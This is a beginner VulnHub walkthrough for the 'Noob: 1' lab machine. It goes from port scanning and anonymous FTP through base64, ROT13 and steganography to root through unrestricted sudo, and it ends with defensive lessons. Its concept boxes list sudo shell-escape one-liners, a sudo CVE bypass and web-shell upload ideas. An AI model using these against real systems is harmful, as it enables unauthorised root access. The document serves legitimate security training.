# Noob: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Noob: 1 |
| **Difficulty** | Beginner |
| **Author** | VIEH Group |
| **Released** | 22 September 2021 |
| **VulnHub Entry** | [Noob: 1 on VulnHub](https://vulnhub.com/entry/noob-1,746/) |
| **Download** | [Noob.ova (3.1 GB)](https://download.vulnhub.com/noob/Noob.ova) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Linux (Ubuntu-based; vsftpd 3.0.3, OpenSSH on a non-standard port) |

> MD5 of the official archive: `BC71D24EAA92D992AFC87194A7AF789F`. Verify it before importing.

---

> ### 📖 How to read this walkthrough
>
> Boxes marked **📖 Concept** stop and explain the *idea* behind what you are about to
> do — not just the command, but what it is and why it works. They are the point of
> this document; the commands are only the demonstration.
>
> Each box links to [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md), the repository-wide
> primer on fundamentals (networking, how nmap works, wordlists, shells, privilege
> escalation). Read the box here for the idea, follow the link when you want the full
> treatment.
>
> **Brand new to this?** Start with
> [CONCEPTS §2 — Networking you must know first](../../docs/CONCEPTS.md#2-networking-you-must-know-first),
> then [§5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work).

---

## 0. What you will learn

This is a genuinely *beginner* box — no buffer overflows, no custom exploits. It teaches the core
habits of a pentest:

- **Port scanning**: spotting a service running on an unusual, high port.
- **Anonymous FTP**: downloading files from an FTP server that lets anyone in.
- **Decoding data**: recognising and reversing **base64**.
- **Web login attacks**: using leaked credentials against a login form.
- **Steganography**: hiding data inside images with `steghide`.
- **ROT13 / simple ciphers**: reading an obfuscated hint file.
- **`sudo` abuse**: using over-permissive `sudo` rights to become root.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). You should have Kali running and be able to import an OVA/VM.

---

## 1. Reconnaissance — finding the target

> **Goal:** work out the target's IP address on your isolated lab network.

Identify your own lab address first:

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:aa:bb:cc brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.10/24 brd 192.168.56.255 scope global dynamic eth0
```


> ### 📖 Concept — What is reconnaissance?
>
> **Reconnaissance** ("recon") is the phase where you work out *what exists*
> before you try to break into anything. It is deliberately broad and shallow: you
> are drawing a map, not attacking a position. The term comes straight from the
> military — send scouts to look at the terrain before committing troops.
>
> On a lab box, recon almost always means one thing: **find the target's IP.** The
> tools above do it with **ARP** — the layer-2 protocol that answers *"which
> hardware address owns this IP?"* ARP cannot be blocked by a host firewall the way
> TCP can, which is why it is the most reliable way to enumerate a local subnet. A
> machine that refuses to answer `ping` will still answer ARP.
>
> **Read the output carefully.** One entry is your gateway (usually `.1`), one is
> **you** (match the MAC from `ip a`), and the rest are candidates. The first three
> octets of a MAC identify the vendor: `08:00:27` is VirtualBox, `00:0c:29` and
> `00:50:56` are VMware, `00:15:5d` is Hyper-V. **Always confirm the target's MAC
> against your hypervisor's settings** — attacking the wrong host is the classic
> beginner error.
>
> **Deep dive:** [CONCEPTS §3 — What is reconnaissance?](../../docs/CONCEPTS.md#3-what-is-reconnaissance) ·
> [§4 — Host discovery](../../docs/CONCEPTS.md#4-host-discovery--who-is-out-there)

```bash
# ARP-scan the subnet — fast, uses ARP not TCP
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   PCS Systemtechnik GmbH   (this is Kali)
192.168.56.101  08:00:27:dd:ee:ff   PCS Systemtechnik GmbH
```

**Target IP:** `192.168.56.101` (use whatever *you* discover).

> **Why it works:** Every local host answers ARP even when it blocks pings, making ARP scanning the
> most reliable discovery method on a host-only lab network.

---


> ### 📖 Concept — What is enumeration, and how is it different from scanning?
>
> **Enumeration** is interrogating the services you found to extract *specific,
> actionable detail*: usernames, directory paths, share names, versions, database
> tables.
>
> | | **Scanning** | **Enumeration** |
> | --- | --- | --- |
> | Question | *"Is something there?"* | *"What exactly is there, and what can I ask it for?"* |
> | Output | Ports, versions | **Usernames, paths, shares, credentials, data** |
> | Example | `nmap -p- -sV` → "port 80 open" | `wpscan -e u` → "users: michael, steven" |
>
> **Enumeration produces the nouns that exploitation needs.** You cannot brute force
> a login without a username. You cannot crack a hash you never found. You cannot
> exploit an upload path you do not know. Every successful foothold traces back to an
> enumerated fact — which is why so many VulnHub authors write "ENUMERATION IS THE
> KEY" in capitals. They are telling you which phase you are skipping.
>
> **Deep dive:** [CONCEPTS §6 — What is enumeration?](../../docs/CONCEPTS.md#6-what-is-enumeration)

## 2. Enumeration

### 2.1 Full TCP sweep


> ### 📖 Concept — What is nmap, and how does a port scan work?
>
> **`nmap`** ("Network MAPper") discovers hosts and the services they run. It has no
> magic: it **sends deliberately crafted packets and classifies the responses**.
> Understand that and every flag becomes predictable.
>
> A **port** (0–65535) identifies *which program* on a host receives a packet; the IP
> address gets you to the machine, the port gets you to the service. TCP is
> connection-oriented, so a scan is really a conversation — the **three-way
> handshake**: `SYN` → `SYN-ACK` → `ACK`. The target has only three possible
> replies, and they map directly onto the words in the output:
>
> | Target's reply | nmap reports | Meaning |
> | --- | --- | --- |
> | **SYN-ACK** | `open` | A program is listening |
> | **RST** | `closed` | Host up, nothing listening there |
> | *(nothing)* / ICMP unreachable | `filtered` | A firewall dropped it |
>
> **Read the line everyone skips:** `Not shown: 65532 closed tcp ports
> (conn-refused)`. `65535 − 65532 = 3` interesting ports, and `(conn-refused)` is
> the *reason* — the target sent RSTs, so it is up and answering, not firewalled.
> Add `--reason` to any scan to see this evidence column explicitly; it is the best
> learning flag in nmap.
>
> **Key flags:** `-p-` scans **all** 65535 ports (the interesting service is often on
> `:8080`, `:666`, `:31337` — skipping this is how beginners get stuck); `-sV`
> fingerprints versions by reading banners and probing against ~10,000 known
> signatures; `-sC` runs the safe default NSE scripts; `-T4` is the right speed for
> labs (**`-T5` misses ports** because it abandons slow replies — a false negative is
> worse than slow); `-oA name` writes text, XML and greppable output at once; `sudo`
> enables the faster stealthier SYN scan instead of a full connect.
>
> **`-sV` is the pivot into everything else.** `Apache 2.4.29` implies Ubuntu 18.04;
> `OpenSSH 7.6p1` confirms it. Without versions you cannot use `searchsploit`.
>
> **Deep dive:** [CONCEPTS §5 — What is nmap, and how does it work?](../../docs/CONCEPTS.md#5-what-is-nmap-and-how-does-it-work)

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/noob-alltcp 192.168.56.101
```

> **How to read it:** The box hides SSH on a **non-standard port** (here `55077`). If you only scan
> the default ports you will miss it — always run `-p-`.

### 2.2 Service/version detection

```bash
sudo nmap -sC -sV -p 21,80,55077 -oA scans/noob-services 192.168.56.101
```


> ### 📖 Concept — FTP, and why "anonymous" is the first thing to try
>
> **FTP** (port 21) predates modern authentication. It sends usernames, passwords and
> file contents in **cleartext**, and it has a built-in convention for public access:
> the account **`anonymous`**, traditionally with an email address (or nothing) as the
> password.
>
> ```bash
> ftp target                     # then: anonymous / (blank)
> curl -s ftp://anonymous:@target/
> wget -r ftp://anonymous:@target/          # mirror the whole tree
> nmap -p21 --script ftp-anon,ftp-vuln-cve2010-4221 target
> ```
>
> Inside an FTP session: `ls`, `cd`, `binary` (**switch mode before downloading
> anything non-text** — ASCII mode corrupts binaries), `get`, `mget`, `put`, `recurse`.
>
> **Two things to check immediately.** First, is anonymous access *enabled*? Second, is
> it **writable** — does `put shell.php` succeed? A writable FTP root that overlaps
> the web document root is a web-shell upload with no exploitation required. Also look
> for `backup.zip`, `creds.txt`, `id_rsa`, `web.config` and any `notes.txt` — authors
> leave the next step in a file named something obvious.
>
> ProFTPD 1.3.3c specifically ships a **compile-time backdoor** (`telnet target 6200`
> gives root); check the exact version against Exploit-DB before assuming you need
> credentials.
>
> **Deep dive:** [CONCEPTS §9.5 — FTP](../../docs/CONCEPTS.md#95-ftp--port-21)

```text
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
55077/tcp open  ssh     OpenSSH 7.9p1 Ubuntu (protocol 2.0)
```

> **How to read it:** `vsftpd 3.0.3` on 21 is worth checking for **anonymous login**. SSH is on
> `55077` — remember that number. Exact banners vary by build.

![nmap service scan](images/02-nmap.png)

### 2.3 Anonymous FTP

```bash
ftp 192.168.56.101
# Name: anonymous
# Password: (press Enter)
# ftp> ls -la
```

```text
-rw-r--r--    1 0        0             20 cred.txt
```

```bash
# ftp> get cred.txt
# ftp> quit
cat cred.txt
```

```text
Y2hhbXA6cGFzc3dvcmQ=
```

> **Why it works:** The FTP server allows anonymous logins and someone left a credentials file
> (`cred.txt`) there. Even a "beginner" box rewards simply reading what is on offer.

### 2.4 Decode the credentials

That string is **base64**:


> ### 📖 Concept — Encoding is not encryption
>
> These three get conflated constantly, and the confusion costs hours:
>
> | | **Encoding** | **Hashing** | **Encryption** |
> | --- | --- | --- | --- |
> | Purpose | Represent data in another *format* | Prove integrity / store passwords | Provide *confidentiality* |
> | Reversible? | **Yes — trivially, with no key** | **No** (only guessable) | Yes, **with the key** |
> | Key needed? | No | No | **Yes** |
> | Examples | base64, hex, URL-encoding, ROT13, binary | MD5, SHA-256, bcrypt, phpass | AES, RSA, ChaCha20 |
> | Security value | **Zero** | Depends on the algorithm | Depends on the key |
>
> **Recognise base64 on sight.** Three reliable tells: the character set is only
> `A–Z a–z 0–9 + /` with optional `=` padding; **the length is a multiple of 4**; and
> it is not a fixed-length digest with a `$1$`/`$6$`/`$P$` prefix.
>
> ```bash
> echo 'YWFydGk6YWFydGlAZ21haWwuY29t' | base64 -d; echo
> # aarti:aarti@gmail.com
> ```
>
> > **Base64 is not a secret.** It exists so binary data survives text-only transport
> > — email attachments, HTTP headers, JSON. Seeing it "protecting" a password is a
> > *finding*, not a defence. **Always check whether it is nested:** decode, then test
> > whether the result is itself base64 or hex. Some boxes chain two or three layers.
>
> **Identify hashes by prefix:** 32 hex = MD5 · 40 hex = SHA-1 · 64 hex = SHA-256 ·
> `$1$` = MD5-crypt · `$2b$` = bcrypt · `$6$` = SHA-512-crypt · `$y$` = yescrypt ·
> **`$P$`/`$H$` = phpass (WordPress, Drupal)** · `$apr1$` = Apache `.htpasswd` ·
> `pbkdf2_sha256$` = Django.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
echo 'Y2hhbXA6cGFzc3dvcmQ=' | base64 -d ; echo
```

```text
champ:password
```

> **Why it works:** Base64 is an *encoding*, not encryption — anyone can decode it. Recognise the
> trailing `=` and the character set and you will decode most lab "secrets" instantly.

### 2.5 The website

```bash
curl -I http://192.168.56.101/
```

Browse to `http://192.168.56.101/` in a browser. You will find a simple login form. Use the
credentials we just decoded:

```text
Username: champ
Password: password
```

> **How to read it:** Reusing a credential found in one service against another is the entire point
> of this stage of the box.

Once logged in, the **"About"** page offers a downloadable archive:

```bash
wget http://192.168.56.101/<path>/downloads.rar
```

```text
Saving to: 'downloads.rar'
```

---

## 3. Foothold

### 3.1 Extract the archive

```bash
unrar x downloads.rar
ls -la
```

```text
funny.bmp
funny.jpg
sudo
```

> **How to read it:** "funny" pictures plus a file literally named `sudo` are a giant hint. Images
> are a classic carrier for **steganography**.

### 3.2 Steganography with steghide

Hiding data inside images is called **steganography**; `steghide` is the standard tool for it.


> ### 📖 Concept — Steganography and file carving
>
> CTF authors hide data in files constantly. Know the layers, cheapest first:
>
> | Layer | Tool | What it finds |
> | --- | --- | --- |
> | **Metadata** | `exiftool img.jpg` | Comments, GPS, software version, **author**, dates |
> | **Trailing data** | `binwalk img.jpg`, `strings`, `xxd` | A ZIP or text appended *after* the image's end-of-file marker |
> | **Embedded files** | `binwalk -e`, `foremost`, `scalpel` | Carves out files hidden inside another |
> | **LSB steganography** | `zsteg`, `stegsolve` | Payload in the least-significant bits of pixel data |
> | **Password-protected** | `steghide extract -sf img.jpg` | Data hidden with a passphrase (try the box's other creds) |
>
> ```bash
> exiftool image.jpg
> binwalk image.jpg
> strings -n 6 image.jpg | head -50
> zsteg -a image.png
> steghide extract -sf image.jpg
> ```
>
> **Start with `exiftool` and `binwalk`.** They are instant and they account for most
> CTF "steganography" — which is usually just *a file appended to another file* or *a
> comment in the metadata*, not real LSB embedding. `binwalk` reporting a `Zip archive
> data` at a non-zero offset means exactly that: two files concatenated.
>
> If a ZIP is recovered and password-protected: `zip2john file.zip > zip.hash` then
> `john --wordlist=rockyou.txt zip.hash`, or `fcrackzip -D -u -p dict.txt file.zip`.
>
> **Deep dive:** [CONCEPTS §10 — Encoding vs hashing vs encryption](../../docs/CONCEPTS.md#10-encoding-vs-hashing-vs-encryption)

```bash
steghide extract -sf funny.jpg
```

```text
Enter passphrase:
wrote extracted data to "hint.py".
```

```bash
steghide extract -sf funny.bmp
```

```text
wrote extracted data to "user.txt".
```

> **Why it works:** The images carry hidden payloads. The passphrase may be **blank** (just press
> Enter) or set per build — try blank first. Contents "vary by build", so read whatever you extract.

```bash
cat user.txt
```

```text
<user flag — varies by build>
```

### 3.3 The hint

```bash
cat hint.py
```

```text
jgs:guvf bar vf n fvzcyr bar
```

That text is **ROT13** — each letter shifted 13 places. Decode it with `tr`:

```bash
echo 'jgs:guvf bar vf n fvzcyr bar' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

```text
wtf:this one is a simple one
```

> **How to read it:** `wtf` is a username and `this one is a simple one` is the password — a
> credential for SSH. `tr 'A-Za-z' 'N-ZA-Mn-za-m'` applies ROT13 in both directions.

![the extracted hint and user flag](images/05-stego.png)

---


> ### 📖 Concept — What is privilege escalation, and in what order do you try things?
>
> You have a shell as a low-privileged user — often `www-data`, the account Apache
> runs as, which has no usable password and no home directory. **Privilege
> escalation** is becoming an administrator: `root` on Linux, `SYSTEM` on Windows.
>
> Why bother? An ordinary user can read their own files and almost nothing else. Root
> reads every file, loads kernel modules, changes any password, and installs a
> backdoor that survives a reboot. On a CTF the root flag can only be read by root; in
> a real engagement root is the difference between "we found a weak password" and "the
> entire estate is compromised."
>
> **The discipline is a checklist, worked from cheapest to most destructive:**
>
> | Order | Check | Command |
> | --- | --- | --- |
> | 1 | **What may I already run as root?** | `sudo -l` ← *the single highest-value command* |
> | 2 | What binaries run as their owner regardless of caller? | `find / -perm -u=s -type f 2>/dev/null` |
> | 3 | What extra privileges are attached to binaries? | `getcap -r / 2>/dev/null` |
> | 4 | What runs on a schedule, as root? | `cat /etc/crontab`; `./pspy64 -pf` |
> | 5 | What root-owned file can I write to? | `find / -writable -type f 2>/dev/null` |
> | 6 | Can I read a credential that gets reused? | `wp-config.php`, `.env`, `~/.bash_history` |
> | 7 | Am I in a privileged group? | `id` → `docker`, `lxd`, `disk`, `sudo` |
> | 8 | Is the kernel old enough to exploit? | `uname -a` + `searchsploit` |
>
> **Work it in order.** Steps 1–7 take minutes and are safe. Step 8 (kernel exploits)
> can panic the VM and cost you a re-import, so it is a last resort, not a first
> instinct.
>
> **Also orient yourself first** — it is one line and it tells you which OS you are
> on, which decides everything else:
>
> ```bash
> id; whoami; hostname; uname -a; cat /etc/os-release
> ```
>
> **Deep dive:** [CONCEPTS §15 — Linux privilege escalation](../../docs/CONCEPTS.md#15-linux-privilege-escalation)

## 4. Privilege escalation

### 4.1 SSH in as `wtf`

Remember SSH is on the non-standard port **55077**:

```bash
ssh wtf@192.168.56.101 -p 55077
# Password: this one is a simple one
```

```text
wtf@noob:~$
```

> **How to read it:** Because SSH was on `55077`, you must pass `-p 55077`. This is exactly why
> `nmap -p-` matters.

### 4.2 Check sudo rights


> ### 📖 Concept — What is sudo, and how do you read `sudo -l`?
>
> **`sudo`** ("superuser do") runs a command **as another user** — by default root. It
> exists so administrators can grant *specific* elevated abilities without handing out
> the root password. Its rules live in `/etc/sudoers`, edited only via `visudo`.
>
> `sudo -l` (**l**ist) shows what *you* are permitted. **It is the first command to
> run as any new user on any box** — it costs nothing, and a surprising fraction of
> machines are solved by one line of its output.
>
> **Parse the tokens precisely:**
>
> | Token | Meaning |
> | --- | --- |
> | `(ALL)` | may run as **any** user, including root |
> | `(root)` | only as root |
> | `(ALL:ALL)` | any user **and** any group |
> | `(user)` | only as that specific user — try `sudo -u user …` |
> | **`NOPASSWD:`** | **no password will be requested** |
> | `/usr/bin/foo` | only this binary, at this **absolute path** |
> | `/usr/bin/foo *` | with **any** arguments ← the dangerous case |
> | `/usr/bin/foo -m *` | only with these arguments |
> | `ALL` alone | full root, no restriction |
>
> **The rule that matters:** *any program that can execute another program, granted
> without argument restrictions, is a root shell in disguise.* `python`, `perl`,
> `ruby`, `lua`, `node`, `php`, `bash`, `find`, `vim`, `nano`, `less`, `more`, `man`,
> `awk`, `env`, `gdb`, `tar`, `zip`, `make`, `git`, `watch`, `nmap`, `ftp`.
>
> **Do not invent the payload — look it up on [GTFOBins](https://gtfobins.github.io/).**
> It documents exactly which binaries can be abused when SUID, sudo-able or run by a
> scheduler, organised by capability (shell, file read, file write, reverse shell).
> It is maintained, tested, and explains *why* each line works. The Windows equivalent
> is **LOLBAS**.
>
> ```bash
> sudo watch -x sh -c 'reset; exec sh'          # GTFOBins: watch
> sudo find . -exec /bin/sh \; -quit            # GTFOBins: find
> sudo vim -c ':!sh'                            # GTFOBins: vim
> sudo -u#-1 /bin/bash                           # CVE-2019-14287 (sudo < 1.8.28)
> ```
>
> **Deep dive:** [CONCEPTS §15.2 — sudo rights](../../docs/CONCEPTS.md#152-sudo-rights)

```bash
sudo -l
```

```text
User wtf may run the following commands on noob:
    (ALL : ALL) ALL
```

> **Why it works:** `wtf` has been granted **full sudo**. That is effectively root already — the
> box hands it to you.

```bash
sudo su
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

### 4.3 The root flag

```bash
cat /root/root.txt
```

```text
<base64-encoded root flag — varies by build>
```

> **Note:** The root flag is often base64-encoded. Decode it with
> `echo '<value>' | base64 -d ; echo` if it does not look like plain text. Flag names and contents
> differ between builds.

![root confirmation and flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP with a leaked credentials file | vsftpd 3.0.3, port 21 | Credential disclosure (`champ:password`) |
| 2 | Base64 used as if it were encryption | `cred.txt` | Trivially decoded secret |
| 3 | Credential reuse on the web login | Web app, port 80 | Account takeover → downloadable archive |
| 4 | Sensitive data hidden in images | `funny.jpg`, `funny.bmp` | Steganography leaks a hint and the user flag |
| 5 | SSH exposed on a high port | sshd, port 55077 | Obscurity (not security) — easily found with `-p-` |
| 6 | Over-permissive `sudo` (`(ALL : ALL) ALL`) | `wtf` user | Full privilege escalation to root |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP** and never store credentials on it. File servers must require
  authentication and enforce least privilege.
- **Do not treat encoding as security.** Base64, ROT13 and similar schemes offer zero protection;
  use a real secrets manager.
- **Never reuse credentials across services**, and store no plaintext secrets on the filesystem or
  in a web root.
- **Do not rely on non-standard ports for security.** "Security by obscurity" fails against a full
  port scan; expose SSH through a firewall/VPN, not a hidden port.
- **Least privilege for `sudo`.** Granting `(ALL : ALL) ALL` is equivalent to giving away root. Use
  specific, audited command allow-lists.
- **Monitor and log.** Alert on anonymous FTP logins, unexpected logins from new accounts, and
  `sudo` usage.

---

## 7. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- [VulnHub official entry — Noob: 1](https://vulnhub.com/entry/noob-1,746/)
- [vsftpd — official project page](https://security.appspot.com/vsftpd.html)
- [GNU `tr` — Rot13 example (GNU Coreutils manual)](https://www.gnu.org/software/coreutils/manual/html_node/tr-invocation.html)
- [Steghide — steganography tool](https://steghide.sourceforge.net/)
- [Base64 encoding (RFC 4648)](https://datatracker.ietf.org/doc/html/rfc4648)

---

## 8. Screenshot checklist

- [ ] `images/01-recon-arp-scan.png` — ARP/host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap service scan (FTP, HTTP, SSH on 55077)
- [ ] `images/03-ftp-anon.png` — anonymous FTP and `cred.txt`
- [ ] `images/04-base64.png` — decoding the base64 credentials
- [ ] `images/05-stego.png` — `steghide` extraction + ROT13 hint
- [ ] `images/06-ssh-wtf.png` — SSH login as `wtf` on port 55077
- [ ] `images/07-sudo-l.png` — `sudo -l` showing `(ALL : ALL) ALL`
- [ ] `images/08-root-flag.png` — `id` as root and the root flag

> **How to read it:** Store screenshots in `labs/noob-1/images/` and reference them here with
> relative paths.

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md). Educational use only in authorized lab environments._
